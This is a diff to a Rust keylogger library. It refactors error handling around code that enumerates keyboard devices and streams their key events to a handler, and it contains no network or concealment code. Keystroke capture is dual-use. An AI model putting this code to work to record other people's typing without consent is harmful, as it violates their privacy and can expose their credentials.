@@ -1,15 +1,18 @@
 use async_trait::async_trait;
-use std::io;
+use futures::future::join_all;
 use std::path::Path;
 use std::sync::Arc;
 
 use crate::device::{find_keyboard_devices, KeyEvent, Keyboard};
+use crate::error::KeyloggerError;
+
+pub(crate) type KeyloggerResult<T> = Result<T, KeyloggerError>;
 
 #[async_trait]
 pub trait KeyEventHandler: Send + Sync {
     async fn handle_events(&self, kb_device: &Path, kb_name: &str, ev: Vec<KeyEvent>);
 
-    fn handle_err(&self, err: io::Error) -> io::Result<()> {
+    fn handle_err(&self, err: KeyloggerError) -> Result<(), KeyloggerError> {
         Err(err)
     }
 }
@@ -20,16 +23,16 @@ pub struct Keylogger {
 }
 
 impl Keylogger {
-    pub fn new(ev_handler: impl KeyEventHandler + 'static) -> io::Result<Self> {
+    pub fn new(ev_handler: impl KeyEventHandler + 'static) -> KeyloggerResult<Self> {
         Ok(Self {
             ev_handler: Arc::new(ev_handler),
             keyboards: find_keyboard_devices()?.collect(),
         })
     }
 
-    pub async fn start(self) -> io::Result<()> {
+    pub async fn start(self) -> KeyloggerResult<()> {
         if self.keyboards.is_empty() {
-            return Err(io::Error::new(io::ErrorKind::Other, "no keyboards found"));
+            return Err(KeyloggerError::NoDevicesFound);
         }
 
         let handles = self
@@ -42,18 +45,17 @@ impl Keylogger {
             })
             .collect::<Vec<_>>();
 
-        for handle in handles {
-            handle.await??;
-        }
+        // Discard the result:
+        let _ = join_all(handles).await;
 
-        Ok(())
+        Err(KeyloggerError::KeyloggerTasksExited)
     }
 }
 
 async fn handle_key_events(
     ev_handler: Arc<dyn KeyEventHandler>,
     keyboard: Keyboard,
-) -> io::Result<()> {
+) -> KeyloggerResult<()> {
     let keyboard = Arc::new(keyboard);
     loop {
         let ev = match keyboard.read_key_event().await {
